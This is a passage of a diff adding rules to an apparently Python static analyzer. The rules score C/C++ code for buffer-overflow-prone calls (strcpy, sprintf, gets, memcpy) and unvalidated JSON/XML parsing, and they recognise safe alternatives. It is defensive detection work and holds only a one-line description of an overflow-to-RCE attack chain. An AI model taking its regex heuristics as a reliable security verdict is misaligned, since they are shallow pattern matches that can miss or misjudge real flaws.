+                        "example_attack": f"Attacker sends input larger than buffer → {description} writes beyond bounds → stack/heap corruption → RCE via return address overwrite",
+                        "line_number": line_num,
+                        "code_snippet": code_snippet,
+                        "detection_reasoning": {
+                            "criteria_for_vulnerability": [
+                                f"{description} called without size validation",
+                                "No bounds checking before copying data",
+                                "Missing input validation or sanitization",
+                                "Buffer overflow potential from unchecked input"
+                            ],
+                            "why_vulnerable": [
+                                f"Line {line_num}: {description} without validation",
+                                "No size checking detected before data operation",
+                                "Attacker can provide oversized input causing buffer overflow",
+                                "Memory corruption can lead to code execution",
+                                "Classic C/C++ vulnerability pattern"
+                            ],
+                            "why_not_vulnerable": [],
+                            "patterns_checked": [
+                                "memcpy/strcpy/sprintf/gets usage",
+                                "strncpy/snprintf/fgets (safe alternatives)",
+                                "Size validation (if/strlen/sizeof checks)",
+                                "bounds checking functions"
+                            ],
+                            "evidence": {
+                                "found_patterns": [description],
+                                "line_numbers": [line_num],
+                                "code_snippets": [code_snippet]
+                            }
+                        }
+                    })
+                    self.score = 0
+
+        # Pattern 2: JSON/XML parsing without validation
+        parsing_libs = []
+        if re.search(r'#include\s+[<"]json|rapidjson|nlohmann', code):
+            parsing_libs.append("JSON")
+        if re.search(r'#include\s+[<"]xml|tinyxml|pugixml|libxml', code):
+            parsing_libs.append("XML")
+
+        if parsing_libs:
+            # Check for validation after parsing
+            has_validation = any([
+                re.search(r'\.is\w+\(\)|\.has\w+\(\)|\.contains\(', code),
+                re.search(r'if\s*\([^)]*\.(type|empty|size)\(\)', code),
+                re.search(r'try\s*\{.*parse.*\}\s*catch', code, re.DOTALL),
+            ])
+
+            parse_locations = []
+            parse_locations.extend(find_pattern_locations(code, r'\.parse\('))
+            parse_locations.extend(find_pattern_locations(code, r'\.load\('))
+            parse_locations.extend(find_pattern_locations(code, r'\.decode\('))
+
+            if parse_locations and not has_validation:
+                location = parse_locations[0]
+                line_num = location['line_number']
+                code_snippet = location['line_content']
+
+                libs_str = " and ".join(parsing_libs)
+                self.vulnerabilities.append({
+                    "type": "INSECURE_DESERIALIZATION",
+                    "severity": "MEDIUM",
+                    "description": f"C/C++ {libs_str} parsing without validation - TYPE CONFUSION RISK: Parsing without type/structure validation can lead to logic errors or DoS. ATTACK: Attacker sends malformed JSON/XML → application crashes or behaves unexpectedly. While C++ type safety prevents memory corruption, missing validation can cause logic bugs.",
+                    "recommendation": f"Add validation after parsing: (1) Check field types: if (json.is_string()), (2) Validate required fields: if (json.contains('field')), (3) Use try-catch for parse errors: try {{ json.parse(...) }} catch (parse_error& e) {{ ... }}, (4) Set size limits to prevent DoS",
+                    "line_number": line_num,
+                    "code_snippet": code_snippet,
+                    "detection_reasoning": {
+                        "criteria_for_vulnerability": [
+                            f"{libs_str} parsing without type validation",
+                            "No field existence checking (has/contains)",
+                            "No type checking (is_string/is_int)",
+                            "Missing exception handling for parse errors"
+                        ],
+                        "why_vulnerable": [
+                            f"Line {line_num}: {libs_str} parsing without validation",
+                            "No type or field validation detected",
+                            "Malformed input can cause unexpected behavior",
+                            "Missing try-catch for parse exceptions"
+                        ],
+                        "why_not_vulnerable": [],
+                        "patterns_checked": [
+                            "JSON/XML parsing function calls",
+                            "Type checking methods (.is_*/type)",
+                            "Field validation (.has/.contains)",
+                            "Exception handling (try-catch)"
+                        ],
+                        "evidence": {
+                            "found_patterns": [f"{libs_str} parsing without validation"],
+                            "line_numbers": [line_num],
+                            "code_snippets": [code_snippet]
+                        }
+                    }
+                })
+                if self.score > 0:
+                    self.score = 1
+
+        # Pattern 3: Check for safe patterns
+        safe_patterns = [
+            (r'strncpy|snprintf|fgets', "safe string functions"),
+            (r'std::string|std::vector', "C++ safe containers"),
+            (r'\.is\w+\(\)|\.has\w+\(\)|\.contains\(', "validation methods"),
+        ]
+
+        has_safe_patterns = any(re.search(pattern, code) for pattern, _ in safe_patterns)
+
+        if has_safe_patterns and self.score == 2:
+            # Find safe function usage location
+            safe_locations = []
+            for pattern, desc in safe_patterns:
+                safe_locations.extend(find_pattern_locations(code, pattern))
+
+            if safe_locations:
+                location = safe_locations[0]
+                line_num = location['line_number']
+                code_snippet = location['line_content']
+
+                self.vulnerabilities.append({
+                    "type": "SECURE",
+                    "severity": "INFO",
+                    "description": "SECURE: Uses safe C/C++ parsing practices - bounds-checked functions (strncpy, snprintf, fgets) or C++ safe containers (std::string, std::vector) with validation. These prevent buffer overflows and validate data before use.",
+                    "line_number": line_num,
+                    "code_snippet": code_snippet,
+                    "detection_reasoning": {
+                        "criteria_for_vulnerability": [
+                            "strcpy/sprintf/gets without bounds checking",
+                            "memcpy without size validation",
+                            "Parsing without type/field validation",
+                            "Missing exception handling"
+                        ],
+                        "why_vulnerable": [],
+                        "why_not_vulnerable": [
+                            f"Line {line_num}: Uses safe string/parsing functions",
+                            "Bounds-checked functions prevent buffer overflows",
+                            "C++ containers manage memory safely",
+                            "Validation methods check data before use"
+                        ],
+                        "patterns_checked": [
+                            "unsafe functions (strcpy/sprintf/gets/memcpy)",
+                            "safe alternatives (strncpy/snprintf/fgets)",
+                            "C++ safe containers (std::string/vector)",
+                            "validation patterns"
+                        ],
+                        "evidence": {
+                            "found_patterns": ["Safe C/C++ parsing practices"],
+                            "line_numbers": [line_num],
+                            "code_snippets": [code_snippet]
+                        }
+                    }
+                })
 
         return {
             "score": self.score,
